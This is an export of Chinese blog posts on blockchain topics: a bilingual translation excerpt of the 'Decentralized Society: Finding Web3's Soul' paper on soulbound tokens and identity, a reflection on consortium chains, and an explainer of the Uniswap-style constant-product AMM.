<li>ZK technology (eg. MACI) could cryptographically prevent some attestations made by a Soul from being provable. This would make attempts to sell certain kinds of attestations non-credible, because the briber would have no way to tell whether or not the bribe recipient followed through on their side of the deal. There has been a large body of research on the use of such techniques for voting, but ultimately any non-financialized social mechanism may end up benefiting from similar ideas.</li>
<li>We could encourage whistleblowers as a way of making collusion of significant size unstable. Instead of detecting and penalizing incorrect or abusive behavior, we detect and penalize abusive patterns of collusion. This technique is risky to overuse because of the possibility of false-flag bribes, but it is nevertheless part of the toolkit.</li>
<li>We could use mechanisms from peer-prediction theory to encourage reporting to be honest in all cases except where collusion is extremely large. Instead of the conference attesting to attendees’ attendance, attendees could attest to each other’s attendance, so the number of participants that would need to be bribed to attest to a false claim becomes very large. The rewards need not be financial, but could be SBTs, making the rewards more useful to genuine community members than they are to attackers.</li>
<li>We could use correlation scores that focus on correlations where there is a large incentive to be honest if a group of Souls share a common interest. For example, the correlation scoring technique used in bounded pairwise quadrating funding uses quadratic funding donations themselves to determine how correlated two participants are, and therefore how much to discount their intersection. If two participants share many common interests, their incentive to express this fact to the QF mechanism is certainly diminished with correlation discounting, but it never becomes zero or negative.</li>
</ol>
<p>While the range of identity frameworks proposed is almost limitless, there are four particularly prominent and adjacent paradigms widely discussed in the web3 space that merit comparison: the dominant “legacy” identity ecosystem, the pseudonymous economy, proof of personhood, and verifiable credentials. Each paradigm highlights important contributions and challenges for future development of the social identity paradigm we advocate, and we use such limitations as a springboard for exploring future directions. All that considered, we also explain why we believe our social identity primitives of Souls and soulbound tokens are a more promising path forward for privacy regimes.</p>
</blockquote>
<ol>
<li><strong>SBT 的生态系统可以引导“厚”的社区渠道，在这些渠道中，SBT 通过强大的社会纽带和重复互动表明真正的链下社区成员身份。 这将使社区更容易过滤和撤销冒充者和机器人的 SBT。</strong> 如此密集的渠道——我们经常在教堂、工作场所、学校、聚会小组和民间社会的组织中发现——将为警察博弈（例如，通过机器人、贿赂、冒充）提供更具抗女巫性的社会基础。 “瘦”社交渠道。</li>
<li><strong>嵌套社区可能需要 SBT 将上下文强加在“正下方”的潜在共谋向量上</strong>。例如，如果一个州正在举行一轮融资或投票，该州可能会要求每个参与的公民也持有一个确定的县和市的 SBT。</li>
<li>SBT 生态系统的开放性和密码学可证明性本身可用于<strong>主动检测合谋模式并惩罚不真实行为</strong>——可能会降低合谋 Souls 的投票权，或迫使 Souls 接受代表负面证明的 SBT。例如，如果一个灵魂证明另一个灵魂是机器人的人性，那么案件可以升级并公开验证，导致该灵魂有大量负面证明。这在 GitCoin QF 生态系统中已经在一定程度上发生了，其中使用一系列信号来检测“合谋团体”。</li>
<li>ZK 技术（例如 MACI）可以<strong>通过密码防止灵魂做出的某些证明是可证明的</strong>。这将使出售某些类型的证明的尝试变得不可信，因为贿赂者无法判断受贿者是否遵守了他们的交易。已经有大量关于使用这种技术进行投票的研究，但最终任何非金融化的社会机制都可能最终受益于类似的想法。</li>
<li>我们可以<strong>鼓励举报</strong>人，以此来使大规模的串通变得不稳定。我们不是检测和惩罚不正确或滥用行为，而是检测和惩罚共谋的滥用模式。由于存在虚假贿赂的可能性，这种技术有过度使用的风险，但它仍然是工具包的一部分。</li>
<li>我们可以使用来自<strong>同行预测理论的机制</strong>来鼓励在所有情况下都诚实报告，除非串通非常大。与会议证明与会者的出席不同，与会者可以证明彼此的出席，因此需要贿赂以证明虚假声明的与会者数量变得非常大。奖励不一定是金钱上的，但可以是 SBT，这使得奖励对真正的社区成员比对攻击者更有用。</li>
<li>如果一群灵魂有共同的兴趣，我们可以使用关注相关性的<strong>相关性分数</strong>。例如，有界成对二次融资中使用的相关评分技术使用二次融资捐赠本身来确定两个参与者的相关性，从而确定他们的交集的折扣程度。如果两个参与者有许多共同利益，他们向 QF 机制表达这一事实的动机肯定会随着相关性折扣而减少，但它永远不会变成零或负数。</li>
</ol>
<p>虽然提出的身份框架的范围几乎是无限的，但在 web3 空间中有四个特别突出和相邻的范式被广泛讨论，值得比较：<strong>占主导地位的“传统”身份生态系统、假名经济、人格证明和可验证的凭据</strong>。每个范式都突出了我们所倡导的社会认同范式未来发展的重要贡献和挑战，我们将这些限制作为探索未来方向的跳板。考虑到所有这些，我们还解释了为什么我们相信我们的灵魂和灵魂令牌的社会身份原语是隐私制度的一条更有希望的前进道路。</p>
]]></content>
      <tags>
        <tag>Ethereum</tag>
      </tags>
  </entry>
  <entry>
    <title>联盟链研发以来的思考-2019-10</title>
    <url>/2019/10/29/%E8%81%94%E7%9B%9F%E9%93%BE%E7%A0%94%E5%8F%91%E4%BB%A5%E6%9D%A5%E7%9A%84%E6%80%9D%E8%80%83-2019-10/</url>
    <content><![CDATA[<h3 id="区块链的核心价值："><a href="#区块链的核心价值：" class="headerlink" title="区块链的核心价值："></a>区块链的核心价值：</h3><ol>
<li>提升多中心协作效率</li>
<li>减轻中介持有信息不透明造成的摩擦</li>
</ol>
<p>中国的研究热点集中在联盟链上，同时监管技术也非常重要。目前联盟链的协议比较成熟，大致分为类EVM链和Hyperledger fabric。笔者从目前fabric的路线图和社区人员来看，认为类EVM更加有生命力。</p>
<h4 id="联盟链的4个关键技术"><a href="#联盟链的4个关键技术" class="headerlink" title="联盟链的4个关键技术"></a>联盟链的4个关键技术</h4><ol>
<li>软硬件协同</li>
<li>安全交易隐私。其中SGX严重依赖Intel芯片，Security Zone以来Arm芯片，而服务器芯片大量采用Intel技术，所以基于cpu的可信计算环境实际上是Intel的宣传而已，在国内搞安全要求领域不建议使用。软件密码学实现交易可验证但是不可见，如同态加密，MPC。其中MPC由于通信次数多，独立于区块链的共识机制之外，可以独立运作，所以实际上MPC不需要和区块链结合，目前多方（两方以上）的MPC仍然属于研究阶段。同态加密+零知识证明目前逐渐成熟，如以太坊EIP1724，Zokrates，一账通的3D零知识证明都属本方向，笔者也认为此方向比较适用于区块链</li>
<li>高可用性。如动态成员准入，节点失效后的快速恢复机制，网络持续工作中实现节点升级，节点/共识/存储/通信簿等全方位监控与报警等</li>
<li>高可扩展。1）合约语言；2）存储支持多组织可信存储；3）语言机；4）跨链</li>
</ol>
<h3 id="两点思考："><a href="#两点思考：" class="headerlink" title="两点思考："></a>两点思考：</h3><ol>
<li>BaaS(Blockchain as a Service) </li>
</ol>
<p>例如某文章中，xxx BaaS平台称，该平台目前已支撑了超过500亿元资产的真实性问题 。从这个阐述看，区块链的用户是信任xxx BaaS平台的，并且整条链都是部署与xxx BaaS平台的，那么问题是，既然一方或者多方都信任xxx平台，为什么还需要区块链呢？数据和流程都放置于xxx 的中心化的系统和数据库中，是不是同样的计算架构呢？</p>
<ol start="2">
<li>链上资产和实物资产的对应关系</li>
</ol>
<p>同样是也是对溯源的思考。经常会看到食品溯源的区块链案例，什么数据不可篡改，什么数据真实可靠。问题是，怎么能够证明手里面的视频和链上的数据是对应的呢？目前还没有看到靠谱的案例。</p>
<p>笔者也在不断的思考以上两个问题。</p>
]]></content>
      <tags>
        <tag>产品设计</tag>
      </tags>
  </entry>
  <entry>
    <title>自动做市AMM模型</title>
    <url>/2021/11/26/%E8%87%AA%E5%8A%A8%E5%81%9A%E5%B8%82AMM%E6%A8%A1%E5%9E%8B/</url>
    <content><![CDATA[<p>AMM，Automated Market Maker，自动化的做市商。</p>
<p>其典型协议有 Bancor、Uniswap、Kybernetwork。</p>
<p>AMM的具体业务流程：</p>
<p>1）流动性池：流动性池里面有两种可供交易资产，并通过智能协议进行连接。假设有一个流动性池子中有梨子和苹果，当前苹果的价格是梨子的两倍。流动性池子的配比是按照两个产品的价格的反比，假设流动性池子中梨子是200个的话，苹果的数量就是100个。用户通过观察流动性池子的配比，也能够的出当前池子中两个商品的报价。对于提供流动性池的用户而言，他占有的是池子资产的一定百分比。比如我们可以假设小张和小王两个人，分别占有池子的40%和60%，那么在初始时刻，小张店资产总值是80个梨子和40个苹果，小王的资产总值是120个梨子和60个苹果。</p>
<p>2）恒定乘积模型：在交易前和交易后，两个交易资产的数量乘积是恒定的。这样设计的目的是为了确保整个资产池在交易前后的总价值是一致的。恒定积的公式是：X × Y = K。在梨子和苹果的初始池子中，X=200，Y=100，K=20000。当用户小李拿1个梨子来换苹果，也就意味着新的梨子总量达到了200+1=201个，在K不变的情况下，新的苹果的数量是99.502，也就意味着小李获得的苹果是100-99.502=0.498个。用户实际获得的价格是2.008，这个结果非常接近当前苹果和梨子的价格比2。恒定乘积曲线的切线斜率就是执行价格。恒定乘积K越大，意味着流动性池子的深度越好，交易的价格会越接近于当前市场的价格。</p>
<p>回到流动性提供者小张和小王身上来。在这笔交易以后，流动性池子的配比略有调整，梨子和苹果的数量变为了201:99.502。但是小张和小王对池子的占有并没有发生变化，仍然为40%和60%，因此归属于他们都梨子数量略微增加，苹果的数量略微下降。由于流动性池子的变动较为缓慢，当外界的价格发生变化时，池子的价格变化往往会滞后。AMM系统主要依赖套利者的交易来把池子的价格推向均衡价格，完成对流动性池和报价体系的不断自我修正过程。套利者处于攻势，为追逐利益而来，获得差价利润；流动性池的提供方处于守势，属于被套利者，会承受被套利带来的损失。假设价格是随机行走，长期而言价格仍然会回归现有水平，那么这种损失可能会被弥补。在费用方面，Uniswap每一次交易的手续费是3‰，部分手续费收入分给流动性提供者，也就是小张和小王。</p>
<p>Uniswap V3在2021年退出，提供了选择流动性做市价格区间的功能，进一步强化了产品的领先优势。</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
        <tag>资产交易</tag>
      </tags>
  </entry>
  <entry>
    <title>翻译3-Decentralized Society Finding Web3 Soul</title>
    <url>/2022/05/13/%E7%BF%BB%E8%AF%913-Decentralized%20Society%20Finding%20Web3%20Soul/</url>
    <content><![CDATA[<blockquote>
<h3 id="§8-COMPARISONS-AND-LIMITATIONS"><a href="#§8-COMPARISONS-AND-LIMITATIONS" class="headerlink" title="§8 COMPARISONS AND LIMITATIONS"></a>§8 COMPARISONS AND LIMITATIONS</h3><p>While the range of identity frameworks proposed is almost limitless, there are four particularly prominent and adjacent paradigms widely discussed in the web3 space that merit comparison: the dominant “legacy” identity ecosystem, the pseudonymous economy, proof of personhood, and verifiable credentials. Each paradigm highlights important contributions and challenges for future development of the social identity paradigm we advocate, and we use such limitations as a springboard for exploring future directions. All that considered, we also explain why we believe our social identity primitives of Souls and soulbound tokens are a more promising path forward for privacy regimes.</p>
</blockquote>
<p>虽然提出的身份框架的范围几乎是无限的，但在 web3 空间中有四个特别突出和相邻的范式被广泛讨论，值得比较：占主导地位的“传统”身份生态系统、假名经济、人格证明和可验证的凭证。每个范式都突出了我们所倡导的社会认同范式未来发展的重要贡献和挑战，我们将这些限制作为探索未来方向的跳板。考虑到所有这些，我们还解释了为什么我们相信我们的灵魂和灵魂令牌的社会身份原语是隐私制度的一条更有希望的前进道路。</p>
<blockquote>
<h4 id="8-1-Legacy"><a href="#8-1-Legacy" class="headerlink" title="8.1 Legacy"></a>8.1 Legacy</h4><p>Legacy identity systems rely on pieces of papers or identity cards issued and mediated by a 3rd party (a government, university, employer, etc). Provenance is established by calling up the 3rd party for a confirmation. While the legacy system has an interesting set of properties we should understand more deeply, such systems are wildly ineffcient and do not lend themselves to composability or computation for rapid, effcient coordination. Moreover, these systems lack social context and makes Souls reliant on a centralized 3rd party to confirm membership to a community, rather than the embedding community. For example, most government issued IDs eventually trace back to a birth certificate issued on the authority of a medical doctor and family members, who are the ultimate source of truth and leave out many equally meaningful social connections that—taken together—o￾er far stronger validation. In fact, when centers of concentrated power seek strong identification (e.g., getting a security clearance from a major government) they rarely rely on such documents, instead turning to interviews in social networks. Thus such legacy identity systems tend to concentrate power in the issuer and in those who can undertake the due diligence to get stronger verification, who in turn become calci￾ed and unreliable bureaucracies. A crucial design goal of DeSoc is ensuring that the security requirements of government IDs can be met and exceeded, allowing horizontal networks to make greater security available to all users and through a range of social substrates.</p>
</blockquote>
<p>传统身份系统依赖于由第三方（政府、大学、雇主等）发行和调解的文件或身份证。通过致电第三方进行确认来确定出处。虽然遗留系统具有我们应该更深入地理解的一组有趣的属性，但这些系统效率极低，并且不适合用于快速、有效协调的可组合性或计算。此外，这些系统缺乏社会背景，使得 Souls 依赖于一个集中的第三方来确认社区的成员身份，而不是嵌入社区。例如，大多数政府颁发的身份证最终都可以追溯到由医生和家庭成员授权签发的出生证明，他们是真相的最终来源，并且遗漏了许多同样有意义的社会联系——加在一起——远远超过更强的验证。事实上，当权力集中的中心寻求强有力的身份证明（例如，获得主要政府的安全许可）时，他们很少依赖此类文件，而是转向社交网络中的采访。因此，此类遗留身份系统倾向于将权力集中在发行者和那些能够进行尽职调查以获得更强大验证的人身上，而这些人反过来又会成为刻板和不可靠的官僚机构。<strong>DeSoc 的一个关键设计目标是确保能够满足和超过政府 ID 的安全要求，允许横向网络通过一系列社交基础为所有用户提供更高的安全性。</strong></p>
<blockquote>
<h4 id="8-2-Pseudonymous-Economy"><a href="#8-2-Pseudonymous-Economy" class="headerlink" title="8.2 Pseudonymous Economy"></a>8.2 Pseudonymous Economy</h4><p>The vision of a society based around combining reputation systems with zero knowledge proof mechanisms to preserve privacy has been most widely promoted by Balaji Srinivasan, who coined and popularized the phrase “pseudonymous economy.” His early version emphasizes the use of pseudonyms to avoid discrimination and evade “cancel culture” by social mobs that seek to harm a person’s reputation and break their social ties. It envisions people accumulating transferable zero-knowledge (ZK) attestations in their wallets and evading reputational attacks by transferring a subset of attestations to new wallets, or splitting the attestations amongst multiple wallets, presumably without traceability. In culling attestations to port, a person chooses the level of desired pseudonymity in the new account, weighing a tradeoff between more anonymity (porting fewer attestations) or more distribution to their social network (porting over more attestations).</p>
<p>The practical difference between typical pseudonymous economy proposals and DeSoc is that we deemphasize identity separation as a primary way to protect participants from abuses and cancel culture. Some level of separation (e.g., different Souls between family, work, politics, etc.) may be healthy, but in general there are great disadvantages to relying on the ability to spin up new identities as a primary crutch against attacks. It makes reputation-staking for lending and provenance harder, and it composes poorly with governance mechanisms that try to correct for correlations or Sybils.</p>
<p>Rather than protecting victims by allowing them to re-emerge from attacks with a new–if diminished—identity, DeSoc would allow other approaches, such as contextualizing the attacker. “Cancellation” often arises precisely because statements and actions are taken out of context and viral signals travel through uncontextualized networks, when a person or bot has little social connection or context to a victim. In the same way that SBTs provide provenance to protect against deep fakes, a map of SBTs socially graphs a “hit piece’s” origin. “Hit pieces” essentially are artifacts arising outside of the victim’s communities (as reflected by shared SBT memberships), or lacking SBT attestations from the victim’s communities—which should cast doubt on the piece’s veracity. SBTs also empower victims to launch a defensive response to counteract the hit, curated and propagated from their network of trust (represented here by the patterns of co-holding of SBTs). By maintaining social context, people can maintain trust, even if they are under threat of cancellation, and hold attackers accountable. Improving provenance improves the social foundation of truth.</p>
</blockquote>
<h4 id="8-2-假名经济"><a href="#8-2-假名经济" class="headerlink" title="8.2 假名经济"></a>8.2 假名经济</h4><p>Balaji Srinivasan 最广泛地推动了基于将声誉系统与零知识证明机制相结合以保护隐私的社会愿景，他创造并推广了“假名经济”一词。他的早期版本强调使用假名来避免社会暴徒的歧视和“取消文化”，这些暴徒试图损害一个人的声誉并打破他们的社会联系。它设想人们在他们的钱包中积累可转移的零知识 (ZK) 证明，并通过将证明子集转移到新钱包或将证明拆分到多个钱包中来逃避声誉攻击，这可能是没有可追溯性的。在挑选要移植的证明时，一个人选择新帐户中所需的假名级别，权衡更多匿名性（移植较少的证明）或更多分布到他们的社交网络（移植更多的证明）之间的权衡。</p>
<p>典型的匿名经济提案和 DeSoc 之间的实际区别在于，我们不再强调身份分离是保护参与者免受滥用和取消文化的主要方式。某种程度的分离（例如，家庭、工作、政治等之间的不同灵魂）可能是健康的，但一般来说，依靠建立新身份的能力作为抵御攻击的主要拐杖存在很大的缺点。它使贷款和出处的声誉赌注变得更加困难，并且它与试图纠正相关性或 Sybils 的治理机制的组合很差。</p>
<p>DeSoc 不会通过允许受害者以新的身份（如果已减少）重新出现在攻击中来保护受害者，而是允许其他方法，例如将攻击者情境化。 “取消”经常出现，因为当一个人或机器人与受害者几乎没有社交联系或背景时，声明和行动是脱离上下文并且病毒信号通过非上下文网络传播的。与 SBT 提供出处以防止深度伪造的方式相同，SBT 的地图在社交上绘制了“热门作品”的起源。 “热门片段”本质上是在受害者社区之外产生的人工制品（如共享的 SBT 成员资格所反映），或者缺乏来自受害者社区的 SBT 证明——这应该会让人怀疑该作品的真实性。 SBT 还使受害者能够发起防御性反应，以抵消从他们的信任网络中策划和传播的打击（此处以共同持有 SBT 的模式为代表）。通过维护社会背景，人们可以保持信任，即使他们面临取消的威胁，并追究攻击者的责任。改善出处可以改善真理的社会基础。</p>
<blockquote>
<h4 id="8-3-Proof-of-personhood-PoP"><a href="#8-3-Proof-of-personhood-PoP" class="headerlink" title="8.3 Proof of personhood (PoP)"></a>8.3 Proof of personhood (PoP)</h4><p>Proof of Personhood protocols (PoP) aim to provide tokens of individual uniqueness, to prevent Sybil attacks and allow non-financialized applications. To do so, they rely on approaches such as global analysis of social graphs, biometrics, simultaneous global key parties, or some combination thereof. However, because PoP protocols seek to represent individual identities—focused on achieving global uniqueness—rather than social identities mapping relationships and solidarities, PoP protocols are limited to applications that treat all humans the same. Most applications we are interested in—such as staking reputation—are relational and move beyond being a unique human to being a differentiated human.</p>
<p>Moreover, PoP protocols are not immune to sybil attacks. In almost all near-term foreseeable applications, PoP systems are effectively open to Sybil attacks, just at a slightly higher cost. Unless most people on the planet are registered for a PoP service and are participating in a particular validation exercise, an attacker can always recruit disinterested humans who are not yet participating to act as Sybils. While such mercenaries are not quite bots, the difference is superficial other than perhaps a small added expense.</p>
<p>Many PoP protocols aim to build a substrate for universal basic income or global democracy. While we don’t share the same ambition, such protocols have spurred us to nonetheless consider how to build gradually towards coordinating plural network goods. In contrast to the binary, individualist and global nature of PoP, our approach aims to construct a rich, contextual and layered substrate for bottom-up reputation, property and governance that allows participation in a range of communities and networks, small and large.</p>
</blockquote>
<h4 id="8-3-人格证明（PoP）"><a href="#8-3-人格证明（PoP）" class="headerlink" title="8.3 人格证明（PoP）"></a>8.3 人格证明（PoP）</h4><p>人格证明协议 (PoP) 旨在提供个人唯一性的代币，以防止 Sybil 攻击并允许非金融化应用程序。为此，他们依赖于社交图谱的全局分析、生物识别、同步的全球关键方或它们的某种组合等方法。然而，由于 PoP 协议寻求代表个人身份——专注于实现全球唯一性——而不是映射关系和团结的社会身份，所以 <strong>PoP 协议仅限于对所有人一视同仁的应用程序</strong>。我们感兴趣的大多数应用程序（例如质押声誉）都是相关的，并且超越了成为一个独特的人，成为一个与众不同的人。</p>
<p>此外，PoP 协议也不能免受女巫攻击。在几乎所有近期可预见的应用中，PoP 系统都有效地对 Sybil 攻击开放，只是成本略高。除非地球上的大多数人都注册了 PoP 服务并且正在参与特定的验证活动，否则攻击者总是可以招募尚未参与的不感兴趣的人充当 Sybils。虽然这样的雇佣兵并不完全是机器人，但区别只是表面的，可能只是增加了一点点费用。</p>
<p>许多 PoP 协议旨在为普遍基本收入或全球民主建立基础。虽然我们的野心不同，但此类协议仍促使我们考虑如何逐步构建以协调多种网络产品。与 PoP 的二元、个人主义和全球性质相比，我们的方法旨在为自下而上的声誉、财产和治理构建一个丰富的、上下文相关的和分层的基础，允许参与各种大小的社区和网络。</p>
<blockquote>
<h4 id="8-4-Verifiable-credentials"><a href="#8-4-Verifiable-credentials" class="headerlink" title="8.4 Verifiable credentials"></a>8.4 Verifiable credentials</h4><p>Verifiable credentials (VCs) are a W3C standard where credentials (or attestations) are zk-shareable at the holder’s discretion. VCs highlight the major limitations of our baseline privacy paradigm and motivate our discussion of privacy extensions above. Until SBTs have privacy extensions that narrow publicity, VCs and SBTs can be seen as natural complements: in particular, SBTs are initially public making them inappropriate for sensitive information like government-issued identification, while VC implementations have struggled with a recovery paradigm that could be addressed by community recovery. The two approaches combined can in the near-term be stronger than either alone. But VCs also have a key limitation: at least in their standardized form, VCs do not support most of the applications we have enumerated because of their unilateral privacy.</p>
<p>Unilateral zk-sharing isn’t incentive-compatible with our use cases, nor does it reflect our norms around privacy. Most of our applications depend on some level of publicity. But under zk-sharing, Souls can’t know another Soul possesses an SBT unless it is shared to them—making reputation-staking, redible commitments, sybil-resistant governance, and simple rental contracts (e.g., apartment lease) impossible to get off the ground as other commitments and encumbrances are not necessarily visible. More deeply, we are skeptical that unilateral shareability is usually the right privacy paradigm. Rarely does one party in a multi-party relationship have the unilateral rights to disclose the relationship without the consent of the other. Just as unilaterally transferable private property is not a rich property regime, simplistic unilateral shareability is not a very rich privacy regime. If two parties co-own an asset and choose to represent their relationship through a VC, such credential doesn’t allow for the mutual-consent and mutual-permissions. This problem travels to more complex cases of plural property and complex organizational forms and permissions, which are a feature of DeSoc.</p>
</blockquote>
<h4 id="8-4-可验证的凭据"><a href="#8-4-可验证的凭据" class="headerlink" title="8.4 可验证的凭据"></a>8.4 可验证的凭据</h4><p>可验证凭证 (VC) 是 W3C 标准，其中凭证（或证明）由持有者自行决定是 zk-shareable。VC 强调了我们基线隐私范式的主要局限性，并激发了我们对上述隐私扩展的讨论。在 SBT 具有缩小宣传范围的隐私扩展之前，VC 和 SBT 可以被视为自然的补充：特别是，SBT 最初是公开的，因此它们不适用于政府颁发的身份证明等敏感信息，而 VC 的实施一直在努力应对一种恢复范式，这可能是由社区恢复解决。在短期内，这两种方法结合起来可能比单独使用任何一种方法都更强大。但是 VC 也有一个关键的限制：至少在它们的标准化形式上，VC 不支持我们列举的大多数应用程序，因为它们具有单方面的隐私性。</p>
<p>单边零知识共享与我们的用例不兼容激励，也不反映我们关于隐私的规范。我们的大多数应用程序都依赖于某种程度的宣传。但是在 zk-sharing 下，Souls 无法知道另一个 Soul 拥有 SBT，除非它被共享给他们——这使得声誉赌注、redible 承诺、抗女巫治理和简单的租赁合同（例如，公寓租赁）无法脱身其他承诺和产权负担不一定是可见的。更深入地说，我们怀疑单方面的可共享性通常是正确的隐私范式。多方关系中的一方很少有未经另一方同意而单方面披露关系的权利。正如单方面可转让的私有财产不是丰富的财产制度一样，简单的单方面可共享性也不是非常丰富的隐私制度。如果两方共同拥有一项资产并选择通过 VC 代表他们的关系，则这种凭证不允许相互同意和相互许可。这个问题涉及到更复杂的复数财产和复杂的组织形式和权限的情况，这是 DeSoc 的一个特点。</p>
<blockquote>
<h3 id="§9-SOUL-BIRTH"><a href="#§9-SOUL-BIRTH" class="headerlink" title="§9 SOUL BIRTH"></a>§9 SOUL BIRTH</h3><p>The path from the current web3 ecosystem to augmented sociality mediated by SBTs faces a classic cold start challenge. On the one hand, SBTs are not transferable. On the other hand, today’s mix of wallets may not be the final home for SBTs because they lack community recovery mechanisms. But in order for community recovery wallets to work, they need a rich variety of SBTs across discrete communities to be secure. What comes first: SBTs or community recovery? Who are the early adopter communities? How do SBTs on different chains interoperate? We cannot aspire to know all the possibilities and answers, but instead sketch a few promising paths for the reader to further explore within the current web3 and even web2 architecture.</p>
</blockquote>
<p>从当前的 web3 生态系统到由 SBT 介导的增强社交的路径面临着典型的冷启动挑战。一方面，SBT 不可转让。另一方面，今天的钱包组合可能不是 SBT 的最终归宿，因为它们缺乏社区恢复机制。但为了让社区恢复钱包发挥作用，他们需要跨不同社区的各种 SBT 来保证安全。首先是什么：SBT 还是社区恢复？ 谁是早期采用者社区？不同链上的 SBT 如何互操作？ 我们不能渴望知道所有的可能性和答案，而是勾勒出一些有希望的路径供读者在当前的 web3 甚至 web2 架构中进一步探索。</p>
<blockquote>
<h4 id="9-1-Proto-SBTs"><a href="#9-1-Proto-SBTs" class="headerlink" title="9.1 Proto SBTs"></a>9.1 Proto SBTs</h4><p>Although the hallmark of SBTs is non-transferability, SBTs may also have another property which may prove more useful in bootstrapping: revocability. It’s possible that SBTs first gestate as revocable, transferable tokens, before growing into non-transferability. A token is revocable if an issuer can burn the token and re-issue it to a new wallet. Burning and re-issuing would make sense when, for example, keys are lost or compromised, and the issuer has an interest in ensuring the tokens are not financialized and sold off to a party—in other words, when the token signals authentic community membership. Employers, churches, meet-up groups, clubs with repeat off-chain interactions are well positioned to burn and re-issue tokens because they have a relationship with a person, and can easily check for impersonation by phone call, video-conference, or simple meeting in person. Single interactions, such as attendance to a concert or conference are poorly suited because community bonds are weaker. </p>
<p>Revocable, transferable tokens are a kind of proto-SBT—serving supportive, placental functions before Soul birth. These tokens buy time both for wallets to gestate secure, community recovery mechanisms and for a person to su￾ciently accumulate proto-SBTs that can eventually be burned and re-issued into non-transferable SBTs. Under this pathway, the question is not, “what happens first: SBTs or community recovery?” Rather, SBTs and community recovery instantiate simultaneously, birthing a Soul.</p>
</blockquote>
<h4 id="9-1-原型-SBT"><a href="#9-1-原型-SBT" class="headerlink" title="9.1 原型 SBT"></a>9.1 原型 SBT</h4><p>尽管 SBT 的标志是不可转让性，但 SBT 可能还具有另一个可能被证明在引导中更有用的属性：可撤销性。SBT 有可能首先孕育为可撤销、可转让的代币，然后才发展为不可转让。如果发行者可以销毁令牌并将其重新发行到新钱包，则令牌是可撤销的。例如，当密钥丢失或泄露时，燃烧和重新发行是有意义的，并且发行人有兴趣确保代币不会被金融化并出售给一方——换句话说，当代币表明真正的社区成员身份时，具有重复链下互动的雇主、教堂、聚会团体、俱乐部很容易销毁和重新发行代币，因为它们与人有关系，并且可以通过电话、视频会议或简单的面对面会议。单一的互动，例如参加音乐会或会议，不太适合，因为社区纽带较弱。</p>
<p>可撤销、可转让的代币是一种原型 SBT——在灵魂出生之前提供支持性的胎盘功能。这些代币为钱包争取时间来孕育安全的社区恢复机制，以及让人们充分积累最终可以被烧毁并重新发行为不可转让的 SBT 的原始 SBT。在这条路径下，问题不是“首先发生什么：SBT 还是社区恢复？”相反，SBT 和社区恢复同时实例化，产生了一个灵魂。</p>
<blockquote>
<h4 id="9-2-Community-Recovery-Wallets"><a href="#9-2-Community-Recovery-Wallets" class="headerlink" title="9.2 Community Recovery Wallets"></a>9.2 Community Recovery Wallets</h4><p>Although today’s wallets lack community recovery, they each have relative strengths and weaknesses in being homes—or perhaps gestational wombs—for SBTs. Proof of Personhood (PoP) protocols have the advantage of already experimenting with social dispute resolution mechanisms, which are the foundation of community recovery. Also, many DAOs use PoPs to facilitate governance, making them natural first issuers of SBTs. However, despite PoPs natural lead, PoP protocols haven’t yet earned broad trust to house valuable token assets, whereas custodial wallets have.</p>
<p>Custodial wallets—despite their flaws of centralization—may thus offer a natural onramp for less sophisticated retail users. Such custodial wallets could also build tooling for retail communities to issue revocable tokens that later convert (or burn and reissue) into SBTs or even tooling for more “corporate” issuers—many of whom are looking for ways to build loyal customer bases in web3 but lack expertise in custody. Once community recovery mechanisms have been formalized and battle-tested, these custodial wallets could decentralize into community recovery, while custodians move on to providing other valuable services in DeSoc (like community management, SBTs issuances, etc.)</p>
<p>For more sophisticated web3 users, decentralized non-custodial wallets (or non-custodial social recovery wallets like Argent and Loopring) are a natural starting point for bootstrapping community recovery mechanisms. Non-custodial wallets have the advantage of being native web3 open-source, and the flexibility to pre-announce and experiment with mechanisms incrementally to a subset of voluntary, sophisticated users to battletest incentives and mix mechanisms (e.g.,mult-sig). All of these approaches—PoPs, custodial, and non-custodial—play an important role in experimenting and onboarding users with different degrees of sophistication and risk tolerance.</p>
</blockquote>
<h4 id="9-2-社区恢复钱包"><a href="#9-2-社区恢复钱包" class="headerlink" title="9.2 社区恢复钱包"></a>9.2 社区恢复钱包</h4><p>尽管今天的钱包缺乏社区恢复能力，但它们在成为 SBT 的家——或者可能是妊娠子宫——方面都有相对的优势和劣势。人格证明 (PoP) 协议的优势在于已经在尝试社会争议解决机制，这是社区恢复的基础。此外，许多 DAO 使用 PoP 来促进治理，使其自然成为 SBT 的第一发行者。然而，尽管 PoP 自然领先，但 PoP 协议尚未赢得广泛信任来存放有价值的代币资产，而托管钱包则有。</p>
<p>托管钱包——尽管存在中心化缺陷——可能因此为不太成熟的零售用户提供了一个自然的入口。此类托管钱包还可以为零售社区构建工具，以发行可撤销的代币，这些代币随后会转换（或销毁和重新发行）为 SBT，甚至可以为更多“企业”发行人提供工具——其中许多人正在寻找在 web3 中建立忠诚客户群的方法，但缺乏监管方面的专业知识。一旦社区恢复机制正式确定并经过实战考验，这些托管钱包可以分散到社区恢复中，而托管人则继续在 DeSoc 中提供其他有价值的服务（如社区管理、SBT 发行等）</p>
<p>对于更成熟的 web3 用户，去中心化的非托管钱包（或像 Argent 和 Loopring 这样的非托管社交恢复钱包）是引导社区恢复机制的自然起点。非托管钱包具有原生 web3 开源的优势，并且可以灵活地预先宣布和逐步试验机制，让一部分自愿的、成熟的用户对激励和混合机制（例如多重签名）进行战斗测试。所有这些方法（PoP、托管和非托管）在试验和引导具有不同复杂程度和风险承受能力的用户方面发挥着重要作用。</p>
<blockquote>
<h4 id="9-3-Proto-Souls"><a href="#9-3-Proto-Souls" class="headerlink" title="9.3 Proto-Souls"></a>9.3 Proto-Souls</h4><p>Norms can also shepherd Souls into existence. As we rethink tokens and wallets, we can also reframe how we think about certain classes of NFTs and tokens that are intended to signal membership. In particular, we can introduce a norm of not transferring NFTs and POAPs issued by reputable institutions that reflect attendance to a conference, work experience, or education credentials. Such transfers of membership tokens—if traded for value—could diminish the reputation of a wallet and perhaps discourage issuers from further issuing membership or POAP tokens to that wallet. Already in the non-custodial ecosystem, a significant number of users have achieved significant financial reputation and stake in their wallets, which could bootstrap as effective collateral for them not to abuse non-transferability expectations.</p>
<p>While all these pathways have respective challenges, we hope that the variety of approaches increases the chance of convergence to our quasi-equilibrium state in the medium term through a small set of steps.</p>
</blockquote>
